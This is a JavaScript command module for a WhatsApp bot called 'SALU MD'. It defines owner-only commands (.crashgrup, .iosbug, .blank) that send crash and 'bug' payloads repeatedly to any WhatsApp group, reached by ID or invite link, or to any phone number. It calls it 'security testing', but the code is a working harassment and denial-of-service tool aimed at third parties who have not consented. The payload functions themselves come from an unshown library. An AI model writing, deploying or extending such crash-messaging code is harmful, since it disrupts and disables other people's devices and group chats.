'use strict';

/**
 * SALU MD :: Device & Group Security Testing / Bug Stanzas
 * ============================================================================
 * Commands: .crashgrup / .iosbug / .blank
 * Access: Restricted strictly to Bot Owner
 * ============================================================================
 */

const { jidNormalizedUser } = require('@whiskeysockets/baileys');
const { blank, IosCrashParsing, iosinVisFC3, crashgrup } = require('../lib/famofc');
const settings = require('../settings');

function toSansBold(str) {
    return String(str || '').replace(/[A-Za-z0-9]/g, c => {
        const code = c.charCodeAt(0);
        if (code >= 65 && code <= 90) return String.fromCodePoint(0x1D5D4 + code - 65);
        if (code >= 97 && code <= 122) return String.fromCodePoint(0x1D5EE + code - 97);
        if (code >= 48 && code <= 57) return String.fromCodePoint(0x1D7EC + code - 48);
        return c;
    });
}

async function crashgrupCommand(sock, from, msg, isOwner, args = []) {
    if (!isOwner) {
        return await sock.sendMessage(from, { text: "❌ *Sirf Bot Owner is command ko use kar sakta hai!*" }, { quoted: msg });
    }

    let targetGroup = from;
    let count = 20;

    const firstArg = (args[0] || '').trim();

    if (firstArg.includes('chat.whatsapp.com/')) {
        const linkMatch = firstArg.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i);
        if (!linkMatch) return await sock.sendMessage(from, { text: "❌ Invalid WhatsApp group link!" }, { quoted: msg });
        const inviteCode = linkMatch[1];
        try {
            const groupInfo = await sock.groupGetInviteInfo(inviteCode);
            targetGroup = groupInfo.id;
            if (!targetGroup.endsWith('@g.us')) targetGroup += '@g.us';
        } catch (e) {
            return await sock.sendMessage(from, { text: `❌ Could not resolve group invite: ${e.message}` }, { quoted: msg });
        }
        if (args[1]) count = Math.min(Math.max(parseInt(args[1]) || 20, 1), 50);
    } else if (firstArg.endsWith('@g.us')) {
        targetGroup = firstArg;
        if (args[1]) count = Math.min(Math.max(parseInt(args[1]) || 20, 1), 50);
    } else if (/^\d+$/.test(firstArg)) {
        count = Math.min(Math.max(parseInt(firstArg) || 20, 1), 50);
    }

    if (!targetGroup.endsWith('@g.us')) {
        return await sock.sendMessage(from, {
            text:
`╭━━━〔 ⚡ ${toSansBold('GROUP CRASH TEST TOOL')} ⚡ 〕━━━┈⊷
┃ 📌 *Usage:*
┃ • *.crashgrup <count>* (Group ke andar)
┃ • *.crashgrup https://chat.whatsapp.com/xxx <count>*
┃ • *.crashgrup 1203634xxxxx@g.us <count>*
┃
┃ ⚠️ *Warning:* Owner Only!
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷`
        }, { quoted: msg });
    }

    await sock.sendMessage(from, { react: { text: '💥', key: msg.key } }).catch(() => {});
    await sock.sendMessage(from, { text: `💥 *Starting crash sequence on:* \`${targetGroup}\`\n📊 Count: ${count}\n⏳ Please wait...` }, { quoted: msg });

    try {
        await crashgrup(sock, targetGroup, count);
        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } }).catch(() => {});
        await sock.sendMessage(from, { text: `✅ *Crash sequence completed on:* \`${targetGroup}\` (${count} rounds)` }, { quoted: msg });
    } catch (err) {
        await sock.sendMessage(from, { text: `❌ *Crash sequence error:* ${err.message}` }, { quoted: msg });
    }
}

async function iosbugCommand(sock, from, msg, isOwner, args = []) {
    if (!isOwner) {
        return await sock.sendMessage(from, { text: "❌ *Sirf Bot Owner is command ko use kar sakta hai!*" }, { quoted: msg });
    }

    if (!args[0]) {
        return await sock.sendMessage(from, {
            text:
`╭━━━〔 ⚡ ${toSansBold('IOS BUG TEST TOOL')} ⚡ 〕━━━┈⊷
┃ 📌 *Usage:*
┃ • *.iosbug <number>|<cycles>*
┃ • Example: *.iosbug 923xxxxxxxxx|5*
┃
┃ ⚠️ *Cycles:* 1 to 20
┃ 🛡️ *Warning:* Owner Only!
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷`
        }, { quoted: msg });
    }

    const parts = args[0].split('|');
    const targetNumber = parts[0].replace(/[^0-9]/g, '');
    let amount = Math.min(Math.max(parseInt(parts[1]) || 1, 1), 20);

    if (!targetNumber) {
        return await sock.sendMessage(from, { text: "❌ Invalid target number!" }, { quoted: msg });
    }

    const targetJid = targetNumber + '@s.whatsapp.net';
    await sock.sendMessage(from, { react: { text: '🍎', key: msg.key } }).catch(() => {});
    await sock.sendMessage(from, { text: `🍎 *Sending iOS Bug to:* +${targetNumber}\n🔄 Cycles: ${amount}\n⏳ Starting...` }, { quoted: msg });

    try {
        for (let i = 0; i < amount; i++) {
            await iosinVisFC3(sock, targetJid);
            await IosCrashParsing(sock, targetJid);
        }
        await sock.sendMessage(from, { react: { text: '✅', key: msg.key } }).catch(() => {});
        await sock.sendMessage(from, { text: `✅ *iOS Bug sent successfully to:* +${targetNumber} (${amount} cycles)` }, { quoted: msg });
    } catch (err) {
        await sock.sendMessage(from, { text: `❌ *iOS Bug failed:* ${err.message}` }, { quoted: msg });
    }
}

async function blankCommand(sock, from, msg, isOwner, args = []) {
    if (!isOwner) {
        return await sock.sendMessage(from, { text: "❌ *Sirf Bot Owner is command ko use kar sakta hai!*" }, { quoted: msg });
    }
    const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from;
    await sock.sendMessage(from, { react: { text: '💣', key: msg.key } }).catch(() => {});
    try {
        await blank(sock, target);
        await sock.sendMessage(from, { text: `✅ *Blank payload delivered to:* ${target}` }, { quoted: msg });
    } catch (err) {
        await sock.sendMessage(from, { text: `❌ *Blank payload error:* ${err.message}` }, { quoted: msg });
    }
}

module.exports = {
    crashgrupCommand,
    iosbugCommand,
    blankCommand
};
